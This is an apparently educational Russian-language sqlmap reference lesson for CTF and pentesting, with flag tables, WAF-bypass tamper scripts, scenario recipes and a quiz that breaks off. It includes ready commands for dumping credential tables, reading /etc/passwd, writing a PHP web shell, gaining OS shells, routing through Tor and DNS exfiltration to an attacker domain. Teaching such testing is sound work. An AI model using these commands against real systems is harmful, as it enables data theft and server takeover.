---
id: web-tool-sqlmap
title: "sqlmap: справочник флагов, дампа и обхода WAF"
category: web
parent: web-tools-sqli
difficulty: medium
order: 1
tags: [sqlmap, sqli, tooling, injection, exploitation, cheat-sheet]
prerequisites: [web-sqli]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 55
summary: "Все флаги sqlmap с примерами: цели, детект, дамп, OS-shell, tamper и готовые рецепты на любой случай."
---

sqlmap — это автоматический инструмент обнаружения и эксплуатации SQL-инъекций. Он не «делает работу за тебя»: он проверяет гипотезы, которые ты ему подсказал (какой параметр, какая техника, какой СУБД), и ускоряет рутину — перебор техник, вытягивание данных побитово, подбор tamper-скриптов. Этот урок — не «введение», а **рабочий справочник**: таблица флагов, что каждый делает, пример и когда к нему тянуться. В конце — раздел «что делать в любой ситуации».

Смежный урок по ручной эксплуатации — `web-tool-sqli-manual`: когда sqlmap молчит (кастомный WAF, странный контекст, JSON/XML, вторая производная), ты должен уметь всё то же руками.

## Шпаргалка: флаги, которые нужны в 90% задач

| Флаг | Что делает | Пример |
|------|-----------|--------|
| `-u URL` | цель — URL с параметром | `sqlmap -u 'https://t/item?id=1'` |
| `-r FILE` | цель — сырой запрос из Burp | `sqlmap -r req.txt` |
| `-p PARAM` | тестировать только параметр | `sqlmap -r req.txt -p id` |
| `--batch` | не задавать вопросов | `--batch` |
| `--dbs` / `--tables` / `--columns` / `--dump` | конвейер дампа | `--dbs` → `-D db --tables` |
| `-D` / `-T` / `-C` | база / таблица / колонки | `-D appdb -T users -C user,pass --dump` |
| `--level` / `--risk` | охват / агрессивность | `--level 3 --risk 2` |
| `--technique` | техники (BEUSTQ) | `--technique=U` |
| `--tamper` | обход WAF | `--tamper=space2comment` |
| `--sql-query` / `--sql-shell` | произвольный SQL | `--sql-query 'SELECT @@version'` |
| `--file-read` / `--file-write --file-dest` | чтение/запись файлов | `--file-read=/etc/passwd` |
| `--os-cmd` / `--os-shell` | RCE через СУБД | `--os-shell` |
| `--threads` / `--delay` | скорость / вежливость | `--threads 5 --delay 0.5` |

## Когда sqlmap, а когда руками

| Ситуация | Инструмент | Почему |
|----------|-----------|--------|
| Стандартный GET/POST-параметр | **sqlmap** | за секунды переберёт техники |
| Есть сохранённый запрос из Burp | **sqlmap `-r`** | cookie/заголовки/тело уже внутри |
| Параметр в JSON-теле | sqlmap `--data` (или `-r`) | нужен явный Content-Type |
| WAF/фильтры | sqlmap `--tamper` + руками | автоматика может не пробить |
| Ответ вообще не меняется | sqlmap time-based / OOB | нужны задержки или DNS |
| Нужно доказательство (PoC) | **руками** (curl) | отчёт требует минимальный запрос |
| Вторая производная (stored) | руками + sqlmap по цепочке | сканер не видит отложенный срабатывающий запрос |

Правило: **сначала sqlmap для быстрой проверки, потом руками для доказательства и обхода**. Никогда не отправляй в отчёт «sqlmap сказал vulnerable» без минимального воспроизводимого запроса.

## Цели: как указать, что инжектить

sqlmap принимает цель ровно одним из способов. Если указать больше одного — он спросит или возьмёт первый.

| Флаг | Что делает | Пример |
|------|-----------|--------|
| `-u URL` | цель — один URL (с параметрами) | `sqlmap -u 'http://t/item?id=1'` |
| `-r FILE` | цель — сырой HTTP-запрос из файла | `sqlmap -r req.txt` |
| `-l LOGFILE` | цель — лог-файл с запросами (Burp/sqlmap) | `sqlmap -l burp.log` |
| `-m FILE` | цель — файл со списком URL (bulk) | `sqlmap -m urls.txt` |
| `-g DORK` | цели из Google-дорка | `sqlmap -g 'inurl:item.php?id='` |
| `-c CONFIG` | цели из ini-файла | `sqlmap -c sqlmap.conf` |
| `--data=BODY` | POST-тело (строка) | `--data='user=a&pass=b'` |
| `--method=M` | HTTP-метод | `--method=PUT` |
| `--cookie=C` | Cookie целиком | `--cookie='PHPSESSID=abc'` |
| `--headers=H` | доп. заголовки (каждый с новой строки) | `--headers='X-Forwarded-For: 127.0.0.1'` |
| `-A UA` / `--user-agent=UA` | свой User-Agent | `-A 'Mozilla/5.0'` |
| `--random-agent` | случайный UA из списка | `--random-agent` |
| `--referer=R` | Referer | `--referer='http://t/'` |
| `--auth-type` + `--auth-cred` | HTTP-аутентификация | `--auth-type=basic --auth-cred='u:p'` |
| `--proxy` | прокси (например, Burp) | `--proxy=http://127.0.0.1:8080` |
| `--tor` / `--check-tor` | через Tor | `--tor --check-tor` |
| `--force-ssl` | принудительно HTTPS | `--force-ssl` |

Файл `-r req.txt` — самый мощный способ: в нём целиком запрос, скопированный из Burp (*Copy to file*). sqlmap сам подставит хост, cookie, тело, метод.

```bash
# req.txt — сырой запрос:
# POST /api/login HTTP/1.1
# Host: target.local
# Content-Type: application/json
# Cookie: sid=abc
#
# {"user":"a","pass":"b"}

sqlmap -r req.txt -p user --batch --level 3 --risk 2
```

## Выбор параметров: -p, --skip, --param

По умолчанию sqlmap тестирует **все** параметры (GET, POST, cookie, заголовки — зависит от `--level`). Явное указание экономит время и шум.

| Флаг | Что делает |
|------|-----------|
| `-p PARAM` | тестировать только этот параметр (можно список через запятую) |
| `--skip=PARAM` | исключить параметр из теста |
| `--param-exclude=REGEX` | исключить по регулярке |
| `--param-del=C` | разделитель параметров в POST (по умолчанию `&`) |
| `-p 'id,user-agent'` | можно тестировать cookie/заголовки по имени |

```bash
sqlmap -r req.txt -p 'id' --batch
sqlmap -u 'http://t/s?q=a&lang=en' -p q --batch
sqlmap -u 'http://t/s?q=a&lang=en' --skip=lang --batch
```

## Управление детектом: --level, --risk, --technique

Это ядро настройки. Начни с дефолта, повышай только при неудаче — высокий уровень = больше шума, больше нагрузки, риск обрушить БД.

| Флаг | Значения | Что делает |
|------|:--------:|-----------|
| `--level` | 1–5 | сколько параметров и техник проверять. 1 — GET/POST; 3 — +Cookie; 4 — +User-Agent/Referer; 5 — +Host/headers |
| `--risk` | 1–3 | 1 — безопасные техники; 2 — +time-based; 3 — +OR-based (может **менять данные**) |
| `--technique` | BEUSTQ | какие техники использовать: **B**oolean, **E**rror, **U**nion, **S**tacked, **T**ime, **Q**uestion-mark (inline) |
| `--time-sec=N` | сек | задержка для time-based (по умолчанию 5) |
| `--dbms=NAME` | — | подсказать СУБД, экономит время |
| `--os=NAME` | — | подсказать ОС |
| `--no-cast` | — | отключить приведение типов (когда UNION ломается на несовпадении типов) |
| `--no-escape` | — | не экранировать строки |
| `--hex` | — | использовать hex для строковых литералов (когда кавычки режутся) |

```bash
# только UNION, быстро и тихо
sqlmap -u 'http://t/item?id=1' --technique=U --batch

# слепая инъекция: только time-based, задержка 3с
sqlmap -u 'http://t/item?id=1' --technique=T --time-sec=3 --batch

# агрессивно (осторожно с --risk 3)
sqlmap -u 'http://t/item?id=1' --level=5 --risk=3 --batch
```

Порядок техник в `BEUSTQ` не случаен: sqlmap сам выбирает по приоритету, но `--technique` заставляет использовать только указанные буквы. Если знаешь, что приложение отдаёт ошибки БД — ставь `E`; если ответ не меняется — `T`.

## Тонкая настройка обнаружения

Когда авто-эвристика ошибается, подскажи ей, что считать «истиной», а что «ложью».

| Флаг | Что делает |
|------|-----------|
| `--string=STR` | строка, присутствующая только при **истинном** ответе |
| `--not-string=STR` | строка, присутствующая только при **ложном** ответе |
| `--regexp=RE` | регулярка для истинного ответа |
| `--code=N` | HTTP-код истинного ответа (например, 200 vs 500) |
| `--titles` | сравнивать по `<title>` страницы |
| `--text-only` | сравнивать только текст (убрать разметку) |
| `--smart` | быстрый режим: останавливаться на первом найденном векторе |
| `--parse-errors` | парсить сообщения об ошибках БД из ответа |

```bash
# «Успех» — страница с приветствием, «провал» — страница логина
sqlmap -u 'http://t/item?id=1' --string='Добро пожаловать' --batch

# ответ стабильно 200/404 -> сравниваем по коду
sqlmap -u 'http://t/item?id=1' --code=200 --batch

# быстрый чек: не перебирать все техники, взять первую рабочую
sqlmap -u 'http://t/item?id=1' --smart --batch
```

## Перечисление и дамп данных

После подтверждения инъекции — стандартный конвейер «база → таблицы → колонки → строки».

| Флаг | Что делает |
|------|-----------|
| `--dbs` | список баз данных |
| `--tables` | список таблиц (`-D db`) |
| `--columns` | список колонок (`-D db -T tbl`) |
| `--schema` | схема БД |
| `--dump` | выгрузить содержимое (`-D -T`, опц. `-C`) |
| `--dump-all` | выгрузить всё (`--exclude-sysdbs` — без системных) |
| `--count` | только количество строк |
| `--search` | поиск по именам таблиц/колонок (`-D`, `-T`, `-C`) |
| `-D DB` | указать базу |
| `-T TBL` | указать таблицу |
| `-C COL1,COL2` | указать колонки |
| `--exclude-sysdbs` | исключить системные базы |
| `--where=COND` | дампить только по условию |
| `--start=N` / `--stop=M` | диапазон строк |
| `--first=N` / `--last=N` | первые/последние N символов |
| `--sql-query=SQL` | выполнить произвольный SQL |
| `--sql-shell` | интерактивная SQL-консоль |

```bash
sqlmap -u 'http://t/item?id=1' --batch --dbs
sqlmap -u 'http://t/item?id=1' --batch -D appdb --tables
sqlmap -u 'http://t/item?id=1' --batch -D appdb -T users --columns
sqlmap -u 'http://t/item?id=1' --batch -D appdb -T users -C username,password --dump
sqlmap -u 'http://t/item?id=1' --batch -D appdb -T users --dump --where="id=1"
sqlmap -u 'http://t/item?id=1' --batch --sql-query="SELECT @@version"
sqlmap -u 'http://t/item?id=1' --batch --search -C password
```

Полезно: sqlmap сам пытается **взломать хэши** после дампа (встроенный словарь `passwords`). Отключить: `--no-crack`. Указать свой список: `--wordlist=/path/rockyou.txt`. Сохранить дамп в файлы: `--dump-format=csv` (или `html`, `sqlite`).

## Продвинутое: SQL shell, файлы, OS

Когда инъекция подтверждена, SQLi часто превращается в чтение/запись файлов и RCE.

| Флаг | Что делает | Условие |
|------|-----------|---------|
| `--file-read=PATH` | прочитать файл на сервере | права СУБД на чтение |
| `--file-write=LOCAL` | записать локальный файл на сервер | `--file-dest` обязателен |
| `--file-dest=PATH` | путь на сервере для записи | права на запись |
| `--os-cmd=CMD` | выполнить одну команду ОС | обычно через UDF/xp_cmdshell |
| `--os-shell` | интерактивный shell ОС | как выше |
| `--os-pwn` | Meterpreter/VNC через OOB | нужен Metasploit |
| `--os-smbrelay` | SMB-relay атака | сложно, редко |
| `--priv-esc` | попытка повышения привилегий | после `--os-shell` |

```bash
sqlmap -u 'http://t/item?id=1' --batch --file-read=/etc/passwd
sqlmap -u 'http://t/item?id=1' --batch --file-write=./shell.php --file-dest=/var/www/html/shell.php
sqlmap -u 'http://t/item?id=1' --batch --os-cmd=id
sqlmap -u 'http://t/item?id=1' --batch --os-shell
sqlmap -u 'http://t/item?id=1' --batch --sql-shell
```

Важно: `--os-shell` в MySQL обычно требует `FILE`-привилегий и каталога, куда можно писать; в MSSQL — `xp_cmdshell` (sqlmap его сам включает); в PostgreSQL — `COPY ... TO PROGRAM`. Если ничего не вышло — это не «sqlmap сломан», а ограничения СУБД/прав.

## Обход WAF и фильтров: --tamper

Tamper-скрипты — это трансформеры payload'а: они переписывают запрос, чтобы он прошёл фильтр. Подключаются через `--tamper=name1,name2`. Несколько скриптов применяются по цепочке.

| Tamper | Против чего | Что делает |
|--------|------------|-----------|
| `space2comment` | фильтр пробелов | ` ` → `/**/` |
| `space2plus` | фильтр пробелов | ` ` → `+` |
| `space2hash` | MySQL | ` ` → `%23%0a` |
| `space2randomblank` | фильтр пробелов | случайный blank-символ |
| `charencode` | слабые фильтры | URL-энкодит весь payload |
| `charunicodeencode` | ASP/ASP.NET | Unicode-энкодинг |
| `apostrophemask` | фильтр кавычек | `'` → `%EF%BC%87` |
| `apostrophenullencode` | фильтр кавычек | `'` → `%00%27` |
| `base64encode` | фильтр ключевых слов | base64 всего payload |
| `randomcase` | регистрозависимый WAF | `SELECT` → `SeLeCt` |
| `randomcomments` | WAF | вставляет `/**/` в ключевые слова |
| `versionedkeywords` | MySQL | `/*!SELECT*/` — выполняется только в MySQL |
| `versionedmorekeywords` | MySQL | версионированные доп. ключевые слова |
| `halfversionedmorekeywords` | MySQL | более мягкий вариант |
| `between` | замена `>`/`=` | `>` → `NOT BETWEEN 0 AND` |
| `equaltolike` | фильтр `=` | `=` → `LIKE` |
| `greatest` | замена `>` | `>` → `GREATEST` |
| `ifnull2ifisnull` | MySQL | переписывает `IFNULL` |
| `concat2concatws` | MySQL | `CONCAT` → `CONCAT_WS` |
| `modsecurityversioned` | ModSecurity | версионированные комментарии |
| `modsecurityzeroversioned` | ModSecurity | `/*!00000SELECT*/` |
| `unmagicquotes` | magic_quotes | `'` → `%bf%27` |
| `percentage` | WAF | `SELECT` → `%S%E%L%E%C%T` |
| `multiplespaces` | WAF | несколько пробелов вокруг ключевых слов |
| `commentbeforeparentheses` | WAF | `(` → `/**/(` |
| `space2mssqlblank` | MSSQL | пробел → mssql-blank |
| `space2mysqlblank` | MySQL | пробел → mysql-blank |
| `hpp` | HPP-фильтр | разбивает параметр (HTTP Parameter Pollution) |
| `xforwardedfor` | IP-фильтр | вставляет X-Forwarded-For |
| `misunion` | фильтр `UNION` | `UNION` → `-.1UNION` |
| `unionalltounion` | фильтр `UNION ALL` | убирает `ALL` |
| `luanginx` | Lua/nginx WAF | обход через `%0a` |

```bash
sqlmap -u 'http://t/item?id=1' --tamper=space2comment --batch --dbs
sqlmap -u 'http://t/item?id=1' --tamper=space2comment,randomcase,charencode --batch --dbs
sqlmap -u 'http://t/item?id=1' --tamper=versionedkeywords,modsecurityversioned --batch --dbs
```

Список всех: `ls /usr/share/sqlmap/tamper/`. Если ни один не помогает — бери один payload и руками подбирай обфускацию (см. `web-tool-sqli-manual`).

## Полная таблица флагов (расширенный охват)

Флаги, не вошедшие в тематические таблицы выше, но нужные на практике. Сгруппированы по категориям `sqlmap -hh`.

**Цель и соединение:**

| Флаг | Что делает | Пример |
|------|-----------|--------|
| `-d DSN` | прямое подключение к БД (без HTTP) | `sqlmap -d 'mysql://u:p@10.0.0.5:3306/db' --dbs` |
| `--openapi FILE/URL` | цели из OpenAPI/Swagger | `sqlmap --openapi api.json --batch` |
| `--openapi-base URL` | базовый URL для spec без хоста | `sqlmap --openapi api.json --openapi-base https://t --batch` |
| `--openapi-tags TAGS` | только операции с этими тегами | `sqlmap --openapi api.json --openapi-tags users --batch` |

**HTTP-запрос, аутентификация, обход сети:**

| Флаг | Что делает | Пример |
|------|-----------|--------|
| `--http1.0` / `--http2` | версия HTTP | `sqlmap -u https://t/?id=1 --http2` |
| `--mobile` | имитировать смартфон (UA) | `sqlmap -u https://t/?id=1 --mobile` |
| `--host HOST` | свой Host-заголовок | `sqlmap -u https://t/?id=1 --host vhost.t` |
| `--cookie-del C` | разделитель cookie | `sqlmap -u https://t/?id=1 --cookie 'a=1;b=2' --cookie-del ';'` |
| `--load-cookies FILE` | cookie из Netscape/wget-файла | `sqlmap -u https://t/?id=1 --load-cookies cookies.txt` |
| `--drop-set-cookie` | игнорировать Set-Cookie | `sqlmap -u https://t/?id=1 --drop-set-cookie` |
| `--auth-file FILE` | клиентский серт/ключ (PEM) | `sqlmap -u https://t/?id=1 --auth-type cert --auth-file c.pem` |
| `--abort-code N` | прервать на проблемном коде | `sqlmap -u https://t/?id=1 --abort-code 403` |
| `--ignore-code N` | игнорировать код | `sqlmap -u https://t/?id=1 --ignore-code 401` |
| `--ignore-redirects` / `--ignore-proxy` | игнорировать редиректы / системный прокси | `sqlmap -u https://t/?id=1 --ignore-proxy` |
| `--proxy-cred u:p` / `--proxy-file FILE` | креды / список прокси | `sqlmap -u https://t/?id=1 --proxy http://127.0.0.1:8080 --proxy-cred a:b` |
| `--tor-port N` / `--tor-type T` | порт / тип Tor | `sqlmap -u https://t/?id=1 --tor --tor-type SOCKS5 --tor-port 9050` |
| `--retry-on REGEX` | повтор при совпадении в ответе | `sqlmap -u https://t/?id=1 --retry-on 'drop'` |
| `--safe-post DATA` / `--safe-req FILE` | безопасный POST / запрос | `sqlmap -u https://t/?id=1 --safe-url https://t/ --safe-post 'x=1' --safe-freq 10` |
| `--skip-urlencode` / `--skip-xmlencode` | не кодировать payload | `sqlmap -u https://t/?id=1 --skip-urlencode` |
| `--csrf-token NAME` / `--csrf-url URL` | авто-подстановка CSRF-токена | `sqlmap -r req.txt --csrf-token csrf --csrf-url https://t/form` |
| `--csrf-method M` / `--csrf-data D` / `--csrf-retries N` | параметры CSRF-запроса | `sqlmap -r req.txt --csrf-token csrf --csrf-url https://t/f --csrf-method GET` |
| `--chunked` | chunked-POST | `sqlmap -u https://t/?id=1 --chunked` |
| `--hpp` | HTTP Parameter Pollution | `sqlmap -u https://t/?id=1 --hpp` |
| `--eval CODE` | Python-код перед запросом | `sqlmap -u https://t/?id=1 --eval "import hashlib;t=hashlib.md5('x').hexdigest()"` |

**Оптимизация и управление инъекцией:**

| Флаг | Что делает | Пример |
|------|-----------|--------|
| `-o` | включить все оптимизации | `sqlmap -u https://t/?id=1 -o` |
| `--no-keep-alive` | отключить Keep-Alive | `sqlmap -u https://t/?id=1 --no-keep-alive` |
| `--null-connection` | длина без тела (по заголовкам) | `sqlmap -u https://t/?id=1 --null-connection` |
| `--skip-static` | пропускать нединамические параметры | `sqlmap -u 'https://t/?id=1&x=2' --skip-static` |
| `--param-filter PLACE` | фильтр параметров по месту (GET/POST/…) | `sqlmap -r req.txt --param-filter POST` |
| `--dbms-cred u:p` | креды СУБД | `sqlmap -u https://t/?id=1 --dbms-cred sa:pass` |
| `--prefix STR` / `--suffix STR` | обёртка payload | `sqlmap -u https://t/?id=1 --prefix "')" --suffix "-- -"` |
| `--invalid-bignum` / `--invalid-logical` / `--invalid-string` | способ инвалидации значений | `sqlmap -u https://t/?id=1 --invalid-bignum` |
| `--proof` | доказать эксплуатацию инъекции | `sqlmap -r req.txt --proof` |

**Детект и техники:**

| Флаг | Что делает | Пример |
|------|-----------|--------|
| `--lengths` | сравнивать страницы по длине | `sqlmap -u https://t/?id=1 --lengths` |
| `--disable-stats` | отключить статмодель задержки | `sqlmap -u https://t/?id=1 --technique=T --disable-stats` |
| `--timeless` | HTTP/2 timing без задержки | `sqlmap -u https://t/?id=1 --timeless` |
| `--union-cols RANGE` | диапазон колонок UNION | `sqlmap -u https://t/?id=1 --union-cols 6-10` |
| `--union-char C` | символ для подсчёта колонок | `sqlmap -u https://t/?id=1 --union-char=1` |
| `--union-from TBL` | FROM в UNION | `sqlmap -u https://t/?id=1 --union-from=dual` |
| `--dns-domain DOM` | OOB-эксфильтрация через DNS | `sqlmap -u https://t/?id=1 --dns-domain exfil.attacker.tld` |
| `--second-url URL` / `--second-req FILE` | second-order инъекция | `sqlmap -r req.txt --second-url https://t/profile` |

**Enumeration (расширенно):**

| Флаг | Что делает | Пример |
|------|-----------|--------|
| `-a` / `--all` | вытащить всё | `sqlmap -u https://t/?id=1 --all` |
| `-b` / `--banner` | баннер СУБД | `sqlmap -u https://t/?id=1 -b` |
| `-f` / `--fingerprint` | расширенный фингерпринт | `sqlmap -u https://t/?id=1 -f` |
| `--current-user` / `--current-db` / `--hostname` | текущий юзер / БД / хост | `sqlmap -u https://t/?id=1 --current-user --current-db` |
| `--is-dba` | является ли пользователь DBA | `sqlmap -u https://t/?id=1 --is-dba` |
| `--users` / `--passwords` / `--privileges` / `--roles` | юзеры / хэши / права / роли | `sqlmap -u https://t/?id=1 --users --passwords` |
| `-U USER` | конкретный пользователь | `sqlmap -u https://t/?id=1 --privileges -U root` |
| `--comments` / `--statements` / `--procs` | комментарии / запросы / процедуры | `sqlmap -u https://t/?id=1 --procs` |
| `--exclude IDS` | исключить идентификаторы | `sqlmap -u https://t/?id=1 --dump-all --exclude sys` |
| `--pivot-column COL` | колонка-опора для дампа | `sqlmap -u https://t/?id=1 -D db -T t --pivot-column id` |
| `--sql-file FILE` | выполнить SQL из файла | `sqlmap -u https://t/?id=1 --sql-file q.sql` |

**Брутфорс имён и UDF:**

| Флаг | Что делает | Пример |
|------|-----------|--------|
| `--common-tables` / `--common-columns` / `--common-files` | проверить типовые имена таблиц/колонок/файлов | `sqlmap -u https://t/?id=1 --common-tables` |
| `--udf-inject` / `--shared-lib LIB` | инъекция UDF | `sqlmap -u https://t/?id=1 --udf-inject --shared-lib=./lib.so` |

**OS и реестр Windows:**

| Флаг | Что делает | Пример |
|------|-----------|--------|
| `--os-bof` | buffer overflow хранимой процедуры | `sqlmap -u https://t/?id=1 --os-bof` |
| `--msf-path DIR` / `--tmp-path DIR` | путь к Metasploit / временный каталог | `sqlmap -u https://t/?id=1 --os-pwn --msf-path /opt/metasploit` |
| `--reg-read` / `--reg-add` / `--reg-del` | чтение / запись / удаление ключа реестра | `sqlmap -u https://t/?id=1 --reg-read --reg-key 'HKLM\\SOFTWARE\\X' --reg-value V` |
| `--reg-key` / `--reg-value` / `--reg-data` / `--reg-type` | параметры ключа реестра | `sqlmap -u https://t/?id=1 --reg-add --reg-key 'HKLM\\X' --reg-value V --reg-data 1 --reg-type REG_DWORD` |

**Общие и диагностика:**

| Флаг | Что делает | Пример |
|------|-----------|--------|
| `-s SESSIONFILE` | загрузить сессию из файла | `sqlmap -u https://t/?id=1 -s sess.sqlite` |
| `--abort-on-empty` | прервать на пустом результате | `sqlmap -u https://t/?id=1 --abort-on-empty` |
| `--base64 PARAM` / `--base64-safe` | параметр с base64-данными | `sqlmap -u https://t/?id=1 --base64 id` |
| `--binary-fields COLS` | поля с бинарными значениями | `sqlmap -u https://t/?id=1 --binary-fields digest` |
| `--crawl DEPTH` / `--crawl-exclude REGEX` | краулинг сайта от цели | `sqlmap -u https://t/ --crawl 2 --batch` |
| `--csv-del C` / `--charset SET` | разделитель CSV / кодировка blind-дампа | `sqlmap -u https://t/?id=1 --dump --csv-del ';'` |
| `--dump-file FILE` | свой файл дампа | `sqlmap -u https://t/?id=1 --dump --dump-file out.txt` |
| `--eta` | оценка времени до конца | `sqlmap -u https://t/?id=1 --dump --eta` |
| `--forms` | тестировать формы на URL | `sqlmap -u https://t/ --forms --batch` |
| `--mine-params` | искать скрытые GET-параметры | `sqlmap -u https://t/ --mine-params` |
| `--fresh-queries` | игнорировать кэш запросов в сессии | `sqlmap -u https://t/?id=1 --fresh-queries` |
| `--gpage N` | страница Google-дорка | `sqlmap -g 'inurl:id=' --gpage 3` |
| `--har FILE` | трафик в HAR | `sqlmap -u https://t/?id=1 --har traffic.har` |
| `--output-dir DIR` | каталог вывода | `sqlmap -u https://t/?id=1 --output-dir ./out` |
| `--preprocess FILE` / `--postprocess FILE` | скрипты обработки запроса/ответа | `sqlmap -u https://t/?id=1 --preprocess pre.py` |
| `--report-json FILE` | отчёт в JSON | `sqlmap -u https://t/?id=1 --report-json report.json` |
| `--save FILE` | сохранить опции в INI | `sqlmap -u https://t/?id=1 --save sqlmap.conf` |
| `--scope REGEX` | фильтр целей в bulk-режиме | `sqlmap -m urls.txt --scope 't\.local'` |
| `--skip-heuristics` / `--skip-waf` | не искать эвристиками / не определять WAF | `sqlmap -u https://t/?id=1 --skip-waf` |
| `--test-filter F` / `--test-skip F` | выбрать / исключить тесты по payload и названию | `sqlmap -u https://t/?id=1 --test-filter ROW` |
| `--time-limit SEC` | лимит времени работы | `sqlmap -u https://t/?id=1 --time-limit 600` |
| `--web-root DIR` | корень веб-сервера (для os-shell) | `sqlmap -u https://t/?id=1 --web-root /var/www/html` |

**Non-SQL injection и прочее:**

| Флаг | Что делает | Пример |
|------|-----------|--------|
| `--graphql` / `--ldap` / `--nosql` / `--xpath` | тесты GraphQL / LDAP / NoSQL / XPath | `sqlmap -u https://t/?q=1 --nosql` |
| `--ssti` / `--xxe` / `--hql` | тесты SSTI / XXE / HQL | `sqlmap -u https://t/?name=x --ssti` |
| `--jwt` | аудит JWT | `sqlmap -u https://t/api --jwt` |
| `--oob-server URL` / `--oob-token T` | OOB-сервер для blind XXE | `sqlmap -u https://t/api --xxe --oob-server https://oob.t --oob-token x` |
| `-z MNEMONICS` | короткие мнемоники | `sqlmap -u https://t/?id=1 -z 'flu,bat,ban,tec=EU'` |
| `--alert CMD` / `--beep` | команда / звук при находке | `sqlmap -u https://t/?id=1 --alert 'notify-send SQLi'` |
| `--dependencies` | проверить зависимости | `sqlmap --dependencies` |
| `--disable-coloring` / `--disable-hashing` | без цвета / без крэка хэшей | `sqlmap -u https://t/?id=1 --dump --disable-hashing` |
| `--list-tampers` | список tamper-скриптов | `sqlmap --list-tampers` |
| `--offline` | офлайн (только данные сессии) | `sqlmap -u https://t/?id=1 --offline` |
| `--purge` | очистить каталог данных sqlmap | `sqlmap --purge` |
| `--shell` | интерактивный sqlmap-shell | `sqlmap --shell` |
| `--tmp-dir DIR` | локальный временный каталог | `sqlmap -u https://t/?id=1 --tmp-dir /tmp` |
| `--tui` / `--gui` | текстовый / GUI-интерфейс | `sqlmap --tui` |
| `--unstable` | режим нестабильной связи | `sqlmap -u https://t/?id=1 --unstable` |
| `--update` / `--wizard` | обновить sqlmap / мастер для новичков | `sqlmap --wizard` |

> Опущены только внутренние серверные опции (`--server`, `--server-host` и т. п.) и детали TUI — все флаги, значимые для веб-тестирования инъекций, включены.

## Производительность, шум и OPSEC

| Флаг | Что делает | Когда |
|------|-----------|-------|
| `--threads=N` | параллельные запросы (1–10) | ускорить blind-дамп |
| `--delay=N` | пауза между запросами, сек | не «задушить» сервер / обойти rate-limit |
| `--timeout=N` | таймаут ответа, сек | медленные цели |
| `--retries=N` | повторы при ошибке сети | нестабильная связь |
| `--batch` | не задавать вопросов, брать дефолты | скрипты/CI |
| `--flush-session` | сбросить кэш сессии | после правок на сервере |
| `--randomize=PARAM` | случайные значения других параметров | обойти корреляцию/кэш |
| `--parse-errors` | показывать ошибки БД | диагностика |
| `-v N` | уровень вывода (0–6) | `-v 3` показывает payload'ы |
| `--traffic-file=F` | записать весь трафик | разбор/отчёт |
| `--answers=...` | ответить на вопросы заранее | автоматизация |
| `--safe-url` / `--safe-freq` | периодически дёргать «безопасный» URL | не потерять сессию |

```bash
sqlmap -r req.txt -p id --batch --threads=5 --delay=0.5 --flush-session -v 3
sqlmap -u 'http://t/item?id=1' --batch --random-agent --tor --check-tor --delay=1
```

## Разобранные сценарии: что делать в любой ситуации

**1. Быстрая проверка GET-параметра**
```bash
sqlmap -u 'http://target.local/product?id=3' --batch --smart
```

**2. POST-форма**
```bash
sqlmap -u 'http://target.local/login' --data='user=admin&pass=x' --batch --level=2 --risk=2
```

**3. JSON-API (нужен явный Content-Type)**
```bash
sqlmap -u 'http://target.local/api/login' \
  --data='{"user":"admin","pass":"x"}' \
  --headers='Content-Type: application/json' --batch --level=3
```
Если параметр внутри JSON, sqlmap сам выделит `user`/`pass` как параметры.

**4. Запрос из Burp (самый надёжный)**
```bash
sqlmap -r request.txt -p id --batch --level=3 --risk=2
```

**5. Массовый скан списка URL**
```bash
sqlmap -m urls.txt --batch --smart --level=2 --threads=5
```

**6. Только доказать уязвимость (без дампа, для отчёта)**
```bash
sqlmap -u 'http://t/item?id=1' --batch --technique=U --flush-session -v 3
```
`-v 3` покажет точный payload — его и вставляй в PoC.

**7. Ответ не меняется (слепая)**
```bash
sqlmap -u 'http://t/item?id=1' --batch --technique=T --time-sec=5 --string='OK'
```

**8. Стоит WAF**
```bash
sqlmap -u 'http://t/item?id=1' --batch --random-agent --tamper=space2comment,randomcase \
  --delay=1 --level=3
```

**9. За авторизацией**
```bash
sqlmap -r req.txt --batch --cookie='sid=...' --level=3
# или через Burp-прокси, чтобы не терять сессию:
sqlmap -r req.txt --batch --proxy=http://127.0.0.1:8080
```

**10. Получить RCE**
```bash
sqlmap -r req.txt --batch --os-shell
# либо точечно:
sqlmap -r req.txt --batch --file-write=./sh.php --file-dest=/var/www/html/sh.php
```

**11. Всё перебрать (осторожно)**
```bash
sqlmap -u 'http://t/item?id=1' --batch --level=5 --risk=3 --tamper=space2comment --threads=10
```

## Частые ошибки

- **`--risk 3` без нужды.** OR-based payload'ы могут **изменить/удалить** данные. На проде — только `--risk 1..2`.
- **Забыть `--batch`.** Без него sqlmap встанет на интерактивном вопросе и «зависнет» в скрипте.
- **Не указать `-p`.** sqlmap начнёт тестировать все параметры, включая безобидные, — лишний шум и ложные срабатывания.
- **Путать `--dbs` и `--dump`.** `--dbs` — список баз, `--dump` — данные; без `-D/-T` дамп уйдёт в интерактив.
- **Гнаться за `--level 5` сразу.** Начинай с дефолта: высокий уровень перебирает заголовки и часто ломает сессию.
- **Игнорировать `--flush-session`.** Кэш сессии может «помнить» устаревшее состояние; при непонятках — сбрось.
- **Забыть про Content-Type.** JSON/XML-тело без явного заголовка sqlmap не распарсит как надо — используй `-r` или `--headers`.
- **Доверять «sqlmap said vulnerable» без PoC.** Всегда вытащи `-v 3` payload и воспроизведи его через curl.

## Квиз

```quiz
- question: "Какой флаг заставляет sqlmap читать цель из сохранённого сырого HTTP-запроса (с cookie и заголовками)?"
  options:
    - "-u"
    - "-r"
    - "-m"
    - "--dbs"
  answer: 1
  explanation: "-r берёт полный запрос из файла: метод, cookie, тело, заголовки."
- question: "Что делает `--technique=BEUSTQ`?"
  options:
    - "Задаёт набор используемых техник инъекции по буквам"
    - "Повышает уровень сканирования до 5"
    - "Указывает СУБД"
    - "Включает Tor"
  answer: 0
  explanation: "B-boolean, E-error, U-union, S-stacked, T-time, Q-inline."
- question: "Какой флаг повышает число проверяемых параметров и источников (Cookie, User-Agent, Host)?"
  options:
    - "--risk"
    - "--threads"
    - "--level"
    - "--delay"
  answer: 2
  explanation: "--level 1..5 расширяет охват; --risk задаёт агрессивность техник."
- question: "Чем опасен `--risk 3` на продакшене?"
  options:
    - "Он отключает кэш"
    - "OR-based payload'ы могут изменить или удалить данные"
    - "Он замедляет скан"
    - "Он требует root"
  answer: 1
  explanation: "OR-based техники вставляют условия, способные менять данные."
- question: "Для чего нужны tamper-скрипты?"
  options:
    - "Для обхода WAF и фильтров трансформацией payload'а"
    - "Для ускорения дампа"
    - "Для крэка хэшей"
